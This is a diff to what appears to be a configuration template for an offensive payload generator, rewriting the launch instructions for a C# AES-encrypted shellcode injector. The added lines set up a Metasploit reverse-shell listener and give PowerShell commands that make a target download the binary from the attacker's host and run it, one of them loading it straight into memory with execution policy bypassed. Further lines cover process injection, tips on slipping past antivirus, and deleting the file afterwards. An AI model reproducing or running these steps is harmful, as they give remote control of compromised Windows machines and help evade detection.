@@ -120,11 +120,36 @@ output:
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
 
   launch_instructions: |
-    Step 1: Start Metasploit listener
-    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; exploit"
+    C# AES Shellcode Injector - Launch Instructions
 
-    Step 2: Execute on target Windows system
-    {{ output_file }} {{ target_process }}
+    Start Listener:
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; set ExitOnSession false; exploit -j"
 
-    Alternative: Execute with PowerShell
-    powershell -ExecutionPolicy Bypass -File {{ output_file }} {{ target_process }}
+    Transfer and Execute:
+    python3 -m http.server 8080
+    On target: powershell -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} {{ target_process }}"
+
+    In-Memory Execution (C# Binary):
+    python3 -m http.server 8080
+    On target: powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:8080/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [AESInjector.Program]::Main(@('{{ target_process }}'))"
+
+    Notes:
+    - Target process: {{ target_process }} (must be running on target)
+    - Shellcode encrypted with AES-256-CBC (key and IV embedded in binary)
+    - Decryption occurs in-memory before injection
+    - Uses VirtualAllocEx, WriteProcessMemory, CreateRemoteThread for injection
+    - EXITFUNC=thread ensures clean exit without crashing {{ target_process }}
+    - Requires matching architecture (x64 binary → x64 process)
+    - May require administrative privileges depending on target process integrity level
+
+    Troubleshooting:
+    - Injection fails: Verify target process running with `tasklist | findstr {{ target_process }}`
+    - Process not found: Try alternative targets (notepad.exe, explorer.exe, chrome.exe)
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - Access Denied: Target process may be protected (PPL) or running at higher integrity level
+    - AV detection: AES helps but may still be caught; consider additional obfuscation
+    - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection
+
+    Cleanup:
+    On target:
+    del {{ output_file }}
